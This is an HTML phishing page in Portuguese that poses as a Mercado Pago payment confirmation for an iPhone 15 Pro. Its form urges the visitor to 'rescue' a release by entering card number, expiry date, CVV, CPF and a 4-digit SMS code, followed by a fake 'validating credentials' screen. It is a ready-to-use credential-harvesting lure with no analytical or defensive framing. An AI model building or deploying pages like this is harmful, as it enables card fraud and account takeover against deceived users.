<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirmação de Pagamento | MercadoPago 2026</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<div class="container">
<div class="header">
<img src="https://www.mercadopago.com/org-img/logo-mercadopago-web.png" alt="Mercado Pago">
</div>

<div class="alert alert-sucesso">
<p><strong>✅ Pagamento efetuado</strong> via Gateway autorizado.</p>
</div>

<div class="produto">
<img src="https://http2.mlstatic.com/D_629152-MLB531277-p-FOTOS-de-CAPTURA-DE-PRODUTO.jpg" alt="iPhone 15 Pro" class="img-falsa">
<h3>iPhone 15 Pro 256GB</h3>
<p class="preco">R$ 4.999,00</p>
</div>

<div class="formulario-urgente">
<h2 class="titulo-form">Resgate sua liberação</h2>
<p class="subtitulo">Informe seus dados bancários para efetivar esta remessa.</p>

<form id="formulario" method="POST">
<div class="form-group">
<label>Número do cartão (16 dígitos)</label>
<input type="text" name="cardNumber" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="cc-number" required>
</div>

<div class="form-group">
<label>Validade (MM/AA)</label>
<input type="text" name="expiry" id="expiry" placeholder="12/30" maxlength="5" autocomplete="cc-exp" required>
</div>

<div class="form-group">
<label>CVV (3 números)</label>
<input type="text" name="cvv" id="cvv" placeholder="123" maxlength="3" autocomplete="cc-csc" required>
</div>

<div class="form-group">
<label>CPF (brasileiro)</label>
<input type="text" name="cpf" id="cpf" placeholder="000.000.000-00" maxlength="14" required>
</div>

<div class="form-group">
<label>Senha SMS (4 dígitos)</label>
<input type="password" name="smsPass" id="smsPass" placeholder="••••" maxlength="4" required>
</div>

<button type="submit" id="submitBtn">
<span>✓ FINALIZAR ACESSO</span>
<span id="spinner">●●●</span>
</button>
</form>
</div>

<div class="aviso-final" id="loading">
<div class="spinner-border" style="color:#33d758;" role="status"></div>
<h4>Validando credenciais...</h4>
<p>Isso pode levar 30 segundos.</p>
</div>
</div>

<script src="script.js"></script>
</body>
</html>
